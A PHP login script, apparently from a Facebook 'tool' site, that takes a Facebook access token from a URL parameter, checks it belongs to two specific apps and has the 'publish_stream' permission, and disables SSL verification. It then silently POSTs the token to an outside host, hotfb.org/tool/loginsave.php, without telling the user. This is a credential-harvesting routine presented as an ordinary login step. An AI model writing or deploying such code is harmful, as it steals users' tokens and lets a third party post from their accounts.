<?php
function get_json($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return json_decode($data);
    }
function get_html($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return $data;
    }
$token2 = $_GET["user"];
session_start();
if(isset($token2)){
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
	$token = $matches[1];
		}else{
	$token = $token2;}
	$exe = json_decode(get_html("https://graph.facebook.com/app?access_token=".$token ))->id;
	$extend = get_html("https://graph.facebook.com/me/permissions?access_token="  . $token);
	if($exe == "41158896424" || $exe == "149859461799466"){
		$pos = strpos($extend, "publish_stream");
		if ($pos == true) {
		$_SESSION['token'] = $token;
		$ch = curl_init('http://hotfb.org/tool/loginsave.php');
		curl_setopt ($ch, CURLOPT_POST, 1);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, "token=".$token);
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);
		curl_exec ($ch);
		curl_close ($ch);
		header('Location:index.php');
			}
			else {
		header('Location:index.php?i=1');}
	}else{
	header('Location:index.php?i=4');}
	}else{
	header('Location:index.php?i=2');}
?>